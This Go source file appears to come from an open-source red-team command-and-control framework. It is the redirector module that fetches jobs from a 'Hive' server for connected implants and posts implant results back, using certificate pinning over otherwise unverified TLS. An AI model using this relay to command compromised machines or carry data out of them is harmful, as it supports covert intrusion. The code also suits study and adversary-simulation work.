//{{{{{{{ Redirector Hive Coms }}}}}}}
//By Rebujacker - Alvaro Folgado Rueda as an open source educative project

package main

import (
	"fmt"
    "net/http"
    "crypto/tls"
    "encoding/json"
    "bytes"
    "strings"
    "io/ioutil"
	"encoding/hex"
	"crypto/sha256"
	"net"
	"time"
)


/*
Description: Main Redirector Routine to connect to Hive
Flow:
A.Activate lock to avoid multiple of this routine to be spawned
B.Start connect routine to get Jobs towards this redirector from Hive
C.Lock on memory slice from Existing Jobs to be sent to Hive,copy the slice and empty it
D.Loop over the Jobs, and send them one by one to Hive
*/
func connectHive(){

	lock.mux.Lock()
	lock.Lock = 1
	lock.mux.Unlock()
	
	defer unlock()
	//Get Any Jobs from Bots targeting this redirector
	getHive()
	

	jobsToHive.mux.Lock()
	tempJobs := jobsToHive.Jobs
	jobsToHive.Jobs = jobsToHive.Jobs[:0]
	jobsToHive.mux.Unlock()
	
	for i,_ := range tempJobs {
		postHive(tempJobs[i])
	}
	
}

func unlock(){
	lock.mux.Lock()
	lock.Lock = 0
	lock.mux.Unlock()
}


/*
Description: Craft a GET request against Hive to retrieve Jobs that will be delivered to connected Implants
Flow:
A.Check Hive TLS signature before connection
B.Configure http client and GET request
C.Lock on memory slice, and append Jobs from Hive
*/
func getHive(){

	var newJobs []*Job
	
	result := checkTLSignature()
	if result != "Good"{
		return
	}

	//HTTP Clients Conf
	client := &http.Client{
		Transport: &http.Transport{
        	DialContext:(&net.Dialer{
            	Timeout:   10 * time.Second,
            	KeepAlive: 10 * time.Second,
        	}).DialContext,

        	//Skip TLS Verify since we are using self signed Certs
        	TLSClientConfig:(&tls.Config{
            	InsecureSkipVerify: true,
        	}),

        	TLSHandshakeTimeout:   20 * time.Second,   
        	ExpectContinueTimeout: 10 * time.Second,
        	ResponseHeaderTimeout: 10 * time.Second,	
		},

		Timeout: 30 * time.Second,
	}

	req, _ := http.NewRequest("GET", "https://"+redconfig.Roaster+"/red", nil)
	req.Header.Set("Authorization", authbearer)
	res, err := client.Do(req)
	if err != nil {
		addLog("Hive Get Error" + err.Error())
		return
	}

    decoder := json.NewDecoder(res.Body)
    err = decoder.Decode(&newJobs)
	if err != nil {
		addLog("Hive Get Error"+err.Error())
		return
	}

	//Mutex to avoid Race Conditions
	jobsToBichito.mux.Lock()
    jobsToBichito.Jobs = append(jobsToBichito.Jobs,newJobs...)
    jobsToBichito.mux.Unlock()

}

/*
Description: Craft a POST request against Hive to send a Job from an Implant
Flow:
A.Check Hive TLS signature before connection
B.Configure http client and POST request
*/
func postHive(job *Job){


	result := checkTLSignature()
	if result != "Good"{
		return
	}
	
	//Serialize Job, and send it to Hive
	bytesRepresentation := new(bytes.Buffer)
	json.NewEncoder(bytesRepresentation).Encode(job)


	//HTTP Clients Conf
	client := &http.Client{
		Transport: &http.Transport{
        	DialContext:(&net.Dialer{
            	Timeout:   10 * time.Second,
            	KeepAlive: 10 * time.Second,
        	}).DialContext,

        	//Skip TLS Verify since we are using self signed Certs
        	TLSClientConfig:(&tls.Config{
            	InsecureSkipVerify: true,
        	}),

        	TLSHandshakeTimeout:   10 * time.Second,   
        	ExpectContinueTimeout: 4 * time.Second,
        	ResponseHeaderTimeout: 3 * time.Second,	
		},

		Timeout: 20 * time.Second,
	}

	req, _ := http.NewRequest("POST", "https://"+redconfig.Roaster+"/red",bytesRepresentation)
	req.Header.Set("Authorization", authbearer)
	
	_, err := client.Do(req)
	if err != nil {
		fmt.Println(err.Error())
		addLog("Post error"+err.Error())
		return
	}
}

/*
Description: Craft a GET request against Hive to perform this redirector checking
*/
func checking() string{

	result := checkTLSignature()
	if result != "Good"{
		return "Bad TLS"
	}
	
	//HTTP Clients Conf
	client := &http.Client{
		Transport: &http.Transport{
        	DialContext:(&net.Dialer{
            	Timeout:   10 * time.Second,
            	KeepAlive: 10 * time.Second,
        	}).DialContext,

        	//Skip TLS Verify since we are using self signed Certs
        	TLSClientConfig:(&tls.Config{
            	InsecureSkipVerify: true,
        	}),

        	TLSHandshakeTimeout:   10 * time.Second,   
        	ExpectContinueTimeout: 4 * time.Second,
        	ResponseHeaderTimeout: 3 * time.Second,	
		},

		Timeout: 20 * time.Second,
	}
	
	req, _ := http.NewRequest("GET", "https://"+redconfig.Roaster+"/checking", nil)
	req.Header.Set("Authorization", authbearer)
	res, err := client.Do(req)
	if err != nil {
		return "Not able to connect Hive on"+ redconfig.Roaster +"with Error:"+err.Error()
	}
	body, err2 := ioutil.ReadAll(res.Body)
	if err2 != nil {
		return "Bad CHecking Body Decoding"
	}
	
	return string(body)
}



//This two functions check the Hive Certificate signature to make sure it is the Hive we have installed
func checkTLSignature() string{

	var conn net.Conn
	fprint := strings.Replace(redconfig.HiveFingenprint, ":", "", -1)
	bytesFingerprint, err := hex.DecodeString(fprint)
	if err != nil {
		return "Hive TLS Error,fingenprint decoding"+err.Error()
	}
	
	config := &tls.Config{InsecureSkipVerify: true}
	
	if conn,err = net.DialTimeout("tcp", redconfig.Roaster,1 * time.Second); err != nil{
		return "Hive TLS Error,Hive not reachable"+err.Error()
	}	
	
	tls := tls.Client(conn,config)
	tls.Handshake()

	if ok,err := CheckKeyPin(tls, bytesFingerprint); err != nil || !ok {
		return "Hive TLS Error,Hive suplantation?"
	}

	return "Good"


}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool,error) {
	valid := false
	connState := conn.ConnectionState() 
	for _, peerCert := range connState.PeerCertificates { 
			hash := sha256.Sum256(peerCert.Raw)
			if bytes.Compare(hash[0:], fingerprint) == 0 {

				valid = true
			}
	}
	return valid, nil
}

